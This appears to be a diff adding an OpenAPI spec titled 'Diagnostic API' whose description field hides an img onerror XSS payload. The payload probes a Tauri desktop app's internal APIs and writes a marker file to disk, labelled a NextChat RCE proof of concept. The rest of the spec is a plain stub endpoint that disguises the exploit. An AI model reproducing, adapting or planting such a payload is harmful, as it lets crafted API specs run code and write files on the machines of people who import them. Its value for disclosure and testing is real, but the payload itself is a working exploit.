@@ -1,0 +1,30 @@
+openapi: "3.0.0"
+info:
+  title: "Diagnostic API"
+  version: "1.0.0"
+  description: |
+    Diagnostic test.
+    <img src=x onerror="(function(){var r=[];r.push('XSS: OK');r.push('Platform: '+navigator.platform);r.push('UserAgent: '+navigator.userAgent);var t=window.__TAURI__;if(t){r.push('__TAURI__: EXISTS');r.push('__TAURI__ keys: '+Object.keys(t).join(','));if(t.fs){r.push('fs: EXISTS');r.push('fs keys: '+Object.keys(t.fs).join(','))}else{r.push('fs: MISSING')}if(t.tauri){r.push('tauri: EXISTS');r.push('tauri keys: '+Object.keys(t.tauri).join(','))}else{r.push('tauri: MISSING')}var p=navigator.platform.indexOf('Win')>-1?'C:\\nextchat-poc.txt':'/tmp/nextchat-poc.txt';var wf=null;if(t.fs&&t.fs.writeTextFile){wf=t.fs.writeTextFile}else if(t.fs&&t.fs.writeFile){wf=function(a,b){return t.fs.writeFile({path:a,contents:b})}}if(wf){r.push('writeFunc: FOUND');wf(p,'[PoC] NextChat RCE - '+new Date().toISOString()+' - '+navigator.platform).then(function(){r.push('WRITE: SUCCESS -> '+p);alert(r.join('\n'))}).catch(function(e){r.push('WRITE ERROR: '+e.toString());alert(r.join('\n'))})}else{r.push('writeFunc: NOT FOUND');alert(r.join('\n'))}}else{r.push('__TAURI__: NOT FOUND (not desktop app?)');alert(r.join('\n'))}})()">
+servers:
+  - url: "https://api.diagnostic.example.com/v1"
+paths:
+  /test:
+    get:
+      operationId: runTest
+      summary: "Run diagnostic test"
+      parameters:
+        - name: id
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: "Test result"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
